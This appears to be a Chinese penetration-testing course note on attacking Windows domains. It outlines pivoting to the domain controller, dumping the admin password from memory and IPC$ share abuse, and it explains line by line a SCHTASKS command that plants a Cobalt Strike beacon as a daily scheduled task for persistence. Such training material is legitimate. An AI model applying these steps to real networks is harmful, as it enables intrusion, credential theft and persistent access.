02 - 域渗透

一、域渗透思路

目标

获得域控制器 (DC)，可以使用账号登录，并且提权维权。

前提

域渗透前提是，DC 管理员在域成员上进行过登录 (授权)，我们这台域成员拿下，并且可以进行提权，有一些操作都是需要管理员进行授权登录的还是比较常见的（比如远程桌面连接）

《相关实验》

渗透思路

通过域成员主机，定位出城域控制器 IP 及域管理员账号，利用域成员主机作为跳板，扩大渗透范围，利用域管理员可以登陆域中任何成员主机的特性，定位出域管理员登陆过的主机 IP，设法从域成员主机内存中 dump 出域管理员密码，进而拿下域控制器、渗透整个内网。

二、共享目录攻击

IPC$

**IPC$(Internet Process Connection) 是共享 **命名管道 的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机的共享资源时使用。

利用 IPC$，连接者甚至可以与目标主机建立一个连接，利用这个连接，连接者可以得到目标主机上的目录结构、用户列表等信息。

**Windiws 中有一个管理服务叫 IPC$，它提供了 Windows 中一些文件夹的共享服务，可以让域内其它主机通过域名的方式访问域中主机的共享文件夹和文件。其中有一个叫默认共享的目录，在每台主机中都是默认开启，但需要用户名和密码来认证之后才可以访问。Win 2008 r2 以下版本密码保存在 **lass 服务 中。有的在 winlogon 服务 中

成功建立 IPC$ 连接后，攻击者可以访问其他隐藏共享：

共享名 作用 访问权限
C$ C 盘根目录 完全控制（管理员）
D$ D 盘根目录 完全控制（管理员）
ADMIN$ Windows 系统目录 完全控制（管理员）

创建计划任务(提权-反弹会话 + 维权)

0 前提是域控服务器必须以 administrator 登录后,win7 创建的计划任务才可以激活并运行

1 win7 执行打通通道 之前已经运行

2 win7 执行远程任务添加

SCHTASKS /Create

  • Windows 的计划任务管理命令，/Create 表示创建新任务

/TN HTTPBeacon

  • Task Name（任务名称）
  • **将任务命名为 **HTTPBeacon
  • 这通常是一个隐蔽的名称，伪装成正常的网络服务进程

/TR C:\Users\artifact_x64.exe

  • Task Run（要运行的程序）
  • **指定要执行的程序路径为 **C:\Users\artifact_x64.exe
  • artifact_x64.exe 通常是指渗透测试中生成的木马/后门程序（Cobalt Strike 的 payload 常见命名）

/S \\win2016.woniu.com

  • System（目标系统）
  • 指定要创建任务的远程计算机
  • win2016.woniu.com 是域控服务器的完整域名

/U woniu\administrator

  • User（用户名）
  • **使用 **woniu 域的管理员账户 administrator 执行此操作
  • 需要管理员权限才能远程创建计划任务

/P Hacker123!@#

  • Password（密码）
  • 上述账户的密码

/SC DAILY

  • Schedule（日程频率）
  • 设置任务执行频率为每天一次
  • 其他可选值：MINUTE、HOURLY、ONCE、ONLOGON 等

/ST 16:04

  • Start Time（开始时间）
  • 指定任务在每天下午 16:04 执行
  • 24 小时制时间格式
